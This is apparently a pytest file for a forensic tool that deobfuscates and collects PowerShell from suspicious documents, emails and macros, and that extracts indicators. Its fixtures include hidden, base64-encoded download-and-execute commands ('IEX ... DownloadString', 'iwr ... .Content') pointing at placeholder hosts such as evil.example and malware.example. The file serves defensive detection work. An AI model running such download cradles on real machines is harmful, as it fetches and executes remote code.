"""PowerShell collection + layered deobfuscation + its own code tab data."""

from __future__ import annotations

import base64
from pathlib import Path

from docutracex import codefiles
from docutracex.parsers import powershell, ps_deobf
from docutracex.storage import CasePaths


def _enc(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


# --- deobfuscator unit --------------------------------------------------------

def test_encoded_command_is_decoded() -> None:
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
    r = ps_deobf.deobfuscate("powershell -w hidden -nop -enc %s" % _enc(inner))
    assert r["changed"] and "DownloadString" in r["code"]
    assert "http://evil.example/a.ps1" in r["code"]
    assert "encoded-command" in r["methods"]


def test_frombase64_wrapped_is_decoded() -> None:
    b64 = base64.b64encode(b"calc.exe").decode()
    cmd = "[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('%s'))" % b64
    r = ps_deobf.deobfuscate(cmd)
    assert "calc.exe" in r["code"] and "FromBase64String" in r["methods"]


def test_backtick_charcode_concat_format() -> None:
    cmd = r"i`e`x (('{0}{1}' -f 'Download','String') + [char]0x3a)"
    r = ps_deobf.deobfuscate(cmd)
    assert "DownloadString" in r["code"]
    assert {"backtick-strip", "char-code", "format-operator"} <= set(r["methods"])


def test_clean_command_untouched() -> None:
    r = ps_deobf.deobfuscate("Get-ChildItem C:\\Users -Recurse")
    assert not r["changed"]


# --- collection / analyze -----------------------------------------------------

def test_collect_from_dropped_ps1_and_vba(tmp_path: Path) -> None:
    ex = tmp_path / "extracted"
    (ex / "att").mkdir(parents=True)
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
    (ex / "att" / "stage.ps1").write_text("powershell -nop -w hidden -enc %s" % _enc(inner))
    mods = {"oletools": {"code_text": 'Shell "powershell -enc %s"' % _enc(inner)}}
    res = powershell.analyze(tmp_path / "o.doc", ex, mods)
    rules = {f["rule"] for f in res["findings"]}
    assert res["scripts"] and {"ps_deobfuscated", "ps_download", "ps_iex"} <= rules
    assert any("http://evil.example/a.ps1" in s["code"] for s in res["scripts"])


def test_collect_from_js_sandbox_log(tmp_path: Path) -> None:
    mods = {"javascript": {"scripts": [{
        "location": "body:script#1",
        "sandbox": {"log": [{"kind": "call", "name": "WScript.Shell.Run",
                             "args": ["powershell -enc %s" % _enc("Invoke-WebRequest http://x.example")]}]},
    }]}}
    res = powershell.analyze(tmp_path / "o.eml", tmp_path / "noext", mods)
    assert res["scripts"] and any("Invoke-WebRequest" in s["code"] for s in res["scripts"])


def test_powershell_iocs_surface_via_visible_fields(tmp_path: Path) -> None:
    from docutracex import ioc
    ex = tmp_path / "extracted"
    (ex / "a").mkdir(parents=True)
    (ex / "a" / "s.ps1").write_text(
        "powershell -enc %s" % _enc("IEX (iwr 'http://malware.example/p').Content"))
    res = powershell.analyze(tmp_path / "o.doc", ex, {})
    iocs = ioc.extract(ioc.sources_from_modules({"powershell": res}))["iocs"]
    assert any("malware.example" in i["value"] for i in iocs)


def test_codefiles_dumps_powershell(tmp_path: Path) -> None:
    cp = CasePaths("c1", cases_dir=tmp_path)
    cp.root.mkdir(parents=True, exist_ok=True)
    full = "powershell -enc %s" % _enc("calc")
    modules = {"powershell": {"scripts": [{
        "location": "file:a/s.ps1", "kind": "powershell", "code": "calc",
        "code_is_deobfuscated": True, "_full_code": full, "_full_deob": "calc",
    }]}}
    changed = codefiles.annotate(modules, cp)
    assert "powershell" in changed
    sc = modules["powershell"]["scripts"][0]
    assert (cp.root / sc["code_file"]).read_text() == full
    assert (cp.root / sc["code_file_deob"]).read_text() == "calc"
    assert sc["code_file"].startswith("extracted/code/powershell/")
